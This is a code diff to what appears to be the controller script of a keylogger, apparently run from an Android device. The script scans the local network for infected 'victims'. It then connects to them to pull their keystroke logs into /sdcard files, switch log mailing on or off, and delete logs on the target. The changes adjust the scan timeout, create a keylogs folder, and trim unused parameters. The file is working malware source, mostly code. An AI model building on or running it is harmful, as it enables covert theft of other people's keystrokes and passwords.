@@ -1,5 +1,4 @@
 import socket
-import subprocess
 from get_local_addr import get_local_addr
 import os
 
@@ -26,7 +25,7 @@ def scan_lan(PORT):
             os.system('clear')
             print("[*] Checking address: " + addr)
             temp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            temp.settimeout(0.45)
+            temp.settimeout(0.25)
             temp.connect((addr, PORT))
             victims.append(addr)
             temp.close()
@@ -124,13 +123,15 @@ def parse_cmd(victims, PORT):
         parse_cmd(victims, PORT)
 
 
-def get_log(target, PORT, intent, victims):
+def get_log(target, PORT, intent):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         print("[*] Connecting to", target+':'+str(PORT))
         s.connect((target, PORT))
         print(s.recv(26).decode('utf-8'))
         s.send(intent.encode())
+        if not os.path.exists('/sdcard/keylogs/'):
+            os.makedirs('/sdcard/keylogs/')
         f = open('/sdcard/oyes_klog_' + target + '.txt', 'w')
         l = s.recv(1024)
         while l:
@@ -143,7 +144,7 @@ def get_log(target, PORT, intent, victims):
         print("[-] Server went offline")
 
 
-def mail_off(target, PORT, victims, intent):
+def mail_off(target, PORT, intent):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         print("[*] Connecting to", target+':'+str(PORT))
@@ -155,7 +156,7 @@ def mail_off(target, PORT, victims, intent):
         print("[-] Server went offline")
 
 
-def mail_on(target, PORT, victims, intent):
+def mail_on(target, PORT, intent):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         print("[*] Connecting to", target+':'+str(PORT))
@@ -167,7 +168,7 @@ def mail_on(target, PORT, victims, intent):
         print("[-] Server went offline")
 
 
-def rm_log(target, PORT, victims, intent):
+def rm_log(target, PORT, intent):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         print("[*] Connecting to", target+':'+str(PORT))
